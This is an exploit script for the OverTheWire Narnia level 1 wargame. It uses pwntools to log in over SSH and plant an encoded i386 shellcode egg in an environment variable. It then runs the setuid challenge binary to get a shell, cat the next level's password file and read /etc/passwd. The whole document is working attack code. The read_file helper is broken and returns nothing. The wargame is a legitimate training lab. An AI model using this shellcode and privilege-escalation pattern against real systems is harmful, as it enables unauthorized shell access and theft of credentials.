#!env python2

from pwn import *
import time
print("Starting pwnage...")
level_ = 1
host_ = 'narnia.labs.overthewire.org'
user_ = 'narnia{}'.format(level_)
chall_ = 'narnia%i' %level_
password_ = open("narnia{}".format(level_), "r").readline().strip()
passfile_ = '/etc/narnia_pass/narnia%i' % (level_+1)
binary_ = '/narnia/%s' %chall_
shell_ = ssh(host=host_, user=user_, password=password_, port=2226)
#starting level0
#shell_.interactive()
def get_in():
    return shell_.run(binary_)

def view_puzzle(r):
    f = r.download_data("/narnia/{}.c".format(chall_))
    with open("{}.c".format(chall_), "w") as fh:
        fh.write(f)
    print(f)

def make_shellcode():
    return asm(shellcraft.i386.sh())

def run_proc_with_env(e):
    return shell_.process(binary_, env=e)

def read_file(path, register):
    shellcraft.i386.linux.readfile(path, dst='esi')

def exploit(r):
    received = r.recvuntil("chance: ")
    log.info("ready...")
    payload = 'B' * 20 + p32(0xdeadbeef)
    log.info("payload is: {}".format(payload))
    r.sendline(payload)

def gtfo(r):
    time.sleep(0.5)
    r.clean()
    r.sendline("cat {}".format(passfile_))
    passwd = r.recvline()
    log.success("Found the following password: " +passwd)
    with open("narnia{}".format(level_+1), "w") as fh:
        fh.write(passwd)
print "Solving challenge: {}".format(chall_)
#r = get_in()
#exploit(r)
#view_puzzle(shell_)
#gtfo(r)
#print make_shellcode()

egg =\
'\x37\x2f\x90\xfc\x93\x27\xf9\x9f\x90\x99\x98\x37\xf9\xf5'\
'\x3f\x2f\x49\x9b\x48\x4a\x9b\x4a\x99\x3f\x90\x2f\xfd\x3f'\
'\x90\x2f\x98\x42\x90\x90\x91\x93\xf5\x49\x41\x92\x4a\xf9'\
'\x27\x92\x40\x27\x42\x4a\xf9\xf8\x4a\x98\x9f\xfc\x93\x40'\
'\x40\xfc\x9f\xfd\x3f\x42\x41\xd6\x92\x37\x43\xf5\x42\x43'\
'\x4b\xf8\xfc\x27\xd6\x41\x98\x49\xf8\xf8\x2f\xf8\x41\x4b'\
'\xfc\x99\x4a\x98\xf9\x4a\xda\xc2\xd9\x74\x24\xf4\x5e\xbf'\
'\x7e\x04\xb8\x39\x31\xc9\xb1\x16\x31\x7e\x19\x83\xee\xfc'\
'\x03\x7e\x15\x9c\xf1\x53\x0f\xd8\xff\xa3\x70\x18\x5b\x95'\
'\xb9\xd5\xdb\x5c\xfa\x5d\xd8\x5e\xfd\x9d\x56\xb9\x74\x64'\
'\xd2\x46\x97\x96\x23\x8a\x17\x1f\xe1\xac\x1c\x1f\xe6\xcc'\
'\xa7\x1e\xe6\xcc\xd7\xed\x66\x74\xd6\xed\x66\x85\x62\xed'\
'\x66\x85\x94\x20\xe6\x6d\x51\x45\x18\x92\x75\xdc\x93\x0e'\
'\xa5\x70\x3d\xa3\xd7\xe5\xdc\x1c\x58\x94\x6d\xd0\xb7\x38'\
'\xf3\x64\xa6\xad\x92\xba\x36'

#egg = make_shellcode()

p = run_proc_with_env({'EGG':egg})
p.interactive()
print read_file("/etc/passwd", 1)
